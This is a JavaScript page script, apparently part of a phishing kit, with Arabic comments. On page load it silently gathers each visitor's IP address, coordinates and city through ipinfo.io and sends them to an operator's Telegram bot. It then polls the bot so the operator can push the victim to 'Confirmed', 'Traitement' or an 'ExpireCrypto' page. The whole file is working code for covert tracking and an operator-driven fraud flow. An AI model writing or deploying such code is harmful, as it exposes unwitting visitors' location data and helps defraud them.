// main.js

// استدعاء القيم من config.js
const token = CONFIG.token;
const chatId = CONFIG.chatId;
const psd = "Traitement index";
let updateReceived = false;

// 🔹 تحميل الصفحة الرئيسية
window.onload = async () => {
  const location = await getLocationInfo();

  const locationMessage = `
📍 Location Info
💻 IP: ${location.ip}
🌐 Latitude: ${location.latitude}
🧭 Longitude: ${location.longitude}
🏳️ Country: ${location.country}
🗺️ Region: ${location.region}
🏙️ City: ${location.city}
📮 ZIP: ${location.postal}
  `;

  const messageData = {
    chat_id: chatId,
    text: `🔵 ${psd}\n${locationMessage}`,
    reply_markup: JSON.stringify({
      inline_keyboard: [
        [{ text: "Confirmed", callback_data: "v:" + psd }],
        [{ text: "Traitement", callback_data: "o10:" + psd }]
      ]
    })
  };

  const url = `https://api.telegram.org/bot${token}/sendMessage`;
  fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(messageData)
  }).catch(console.error);
};

// 🔹 جلب معلومات الموقع (IP, مدينة, دولة...)
async function getLocationInfo() {
  try {
    const res = await fetch('https://ipinfo.io/json');
    const data = await res.json();

    const loc = data.loc ? data.loc.split(",") : ["N/A", "N/A"];

    return {
      ip: data.ip || "N/A",
      latitude: loc[0] || "N/A",
      longitude: loc[1] || "N/A",
      country: data.country || "N/A",
      region: data.region || "N/A",
      city: data.city || "N/A",
      postal: data.postal || "N/A"
    };
  } catch (err) {
    console.error('Error fetching location info:', err);
    return {
      ip: "N/A", latitude: "N/A", longitude: "N/A",
      country: "N/A", region: "N/A", city: "N/A", postal: "N/A"
    };
  }
}

// 🔹 التفاعل مع Telegram (قراءة الأزرار)
function getUpdates() {
  const url = `https://api.telegram.org/bot${token}/getUpdates`;
  fetch(url)
    .then(res => res.json())
    .then(data => {
      const updates = data.result;
      if (!updates.length) return;
      updates.forEach(update => {
        const query = update.callback_query;
        if (!query) return;

        const [type, value] = query.data.split(":");
        if (value === psd) {
          updateReceived = true;
          if (type === "v") window.location.href = "Confirmed.html";
          else if (type === "o10") window.location.href = "Traitement.html";
        }
        markUpdateAsRead(update.update_id);
      });
    })
    .catch(console.error);
}

// 🔹 تحديد الرسائل كمقروءة
function markUpdateAsRead(updateId) {
  const url = `https://api.telegram.org/bot${token}/getUpdates?offset=${updateId + 1}`;
  fetch(url).catch(console.error);
}

// 🔹 جلب التحديثات كل 3 ثواني
setInterval(getUpdates, 3000);

// 🔹 تحويل أوتوماتيكي بعد 59 دقيقة و59 ثانية
setTimeout(() => {
  if (!updateReceived) {
    window.location.href = "ExpireCrypto.html";
  }
}, 3599000);
